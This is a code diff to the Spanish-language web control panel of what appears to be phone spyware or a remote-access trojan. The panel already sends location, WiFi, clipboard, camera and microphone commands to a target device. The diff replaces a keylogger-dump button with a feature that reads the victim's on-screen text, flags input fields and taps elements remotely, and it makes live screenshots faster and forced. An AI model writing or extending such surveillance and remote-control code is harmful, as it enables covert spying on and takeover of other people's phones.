@@ -116,7 +116,7 @@
           <button onclick="cmd('loc')">Ubicacion</button>
           <button onclick="cmd('wifi')">Redes WiFi</button>
           <button onclick="cmd('clip')">Portapapeles</button>
-          <button onclick="cmd('keylog_dump')">Volcar teclas</button>
+          <button onclick="dumpPantalla()">Leer pantalla (textos)</button>
           <button onclick="cmd('photo',{cam:'back'})">Foto trasera</button>
           <button onclick="cmd('photo',{cam:'front'})">Foto frontal</button>
           <button onclick="cmd('mic',{secs:15})">Grabar micro 15s</button>
@@ -155,7 +155,16 @@
       </div>
 
       <div class="card">
-        <h3>Pantalla <span id="shotinfo" class="kv"></span></h3>
+              <div class="card">
+        <h3>Textos en pantalla <span class="kv" id="dumpinfo"></span></h3>
+        <div class="row" style="margin-bottom:8px">
+          <button class="p" onclick="dumpPantalla()">Leer pantalla</button>
+          <input id="ttexto" placeholder="texto a tocar (ej: Enviar)" style="flex:1;margin:0">
+          <button class="g" onclick="cmd('tap_text',{text:ttexto.value})">Tocar por texto</button>
+        </div>
+        <div class="scroll" id="dumplist" style="max-height:280px"></div>
+      </div>
+<h3>Pantalla <span id="shotinfo" class="kv"></span></h3>
         <div id="shots"></div>
       </div>
 
@@ -343,9 +352,9 @@ function startLive() {
   $('livebtn').textContent = 'EN VIVO: on';
   $('livebtn').className = 'p';
   liveTimer = setInterval(async () => {
-    await cmd('screenshot');
+    await cmd('screenshot', { force: true });
     await loadShots();
-  }, 2500);
+  }, 2000);
 }
 function stopLive() {
   clearInterval(liveTimer);
@@ -357,6 +366,33 @@ function toggleLive() { liveTimer ? stopLive() : startLive(); }
 function closeModal() { $('modal').style.display = 'none'; stopLive(); }
 function manualShot() { cmd('screenshot'); setTimeout(loadShots, 1500); }
 
+function dumpPantalla() { cmd('dump'); document.getElementById('dumpinfo').textContent = '(leyendo...)'; setTimeout(cargarDump, 2500); }
+async function cargarDump() {
+  const d = await api('/api/commands?device=' + encodeURIComponent(DEV));
+  const c = d.commands.find(x => x.cmd === 'dump' && x.status === 'done' && x.result);
+  if (!c) { document.getElementById('dumpinfo').textContent = '(sin datos todavia)'; return; }
+  let arr = [];
+  try { arr = JSON.parse(c.result); } catch (e) { arr = []; }
+  document.getElementById('dumpinfo').textContent = '(' + arr.length + ' elementos)';
+  document.getElementById('dumplist').innerHTML = arr.map(n => `
+    <div class="row" style="align-items:center;border-bottom:1px solid var(--line);padding:2px 0">
+      <button style="min-width:64px" onclick="cmd('tap',{x:${n.x},y:${n.y}})">tocar</button>
+      <button style="min-width:44px" onclick="cmd('tap_text',{text:${JSON.stringify(n.t)}})">txt</button>
+      <span class="mono" style="flex:1">${esc(n.t)}</span>
+      <span class="kv">${n.x},${n.y}${n.editable ? ' CAMPO' : ''}${n.click ? ' click' : ''}</span>
+    </div>`).join('');
+}
+function marcar(px, py) {
+  const r = document.getElementById('modalimg').getBoundingClientRect();
+  const m = document.createElement('div');
+  m.style.cssText = 'position:fixed;width:28px;height:28px;border:2px solid #3ea6ff;border-radius:50%;pointer-events:none;transform:translate(-50%,-50%);z-index:70';
+  m.style.left = (r.left + px) + 'px';
+  m.style.top = (r.top + py) + 'px';
+  document.body.appendChild(m);
+  setTimeout(() => m.remove(), 700);
+}
+
+
 $('modalimg').addEventListener('click', (e) => {
   const w = Number(e.target.dataset.w) || 0;
   const h = Number(e.target.dataset.h) || 0;
@@ -365,7 +401,7 @@ $('modalimg').addEventListener('click', (e) => {
   const x = Math.round((e.clientX - r.left) / r.width * w);
   const y = Math.round((e.clientY - r.top) / r.height * h);
   cmd('tap', { x: x, y: y });
-  log('TOCAR ' + x + ',' + y, 'y');
+  log('TOCAR ' + x + ',' + y, 'y'); marcar(e.clientX - r.left, e.clientY - r.top);
 });
 
 function sendTextFromModal() {
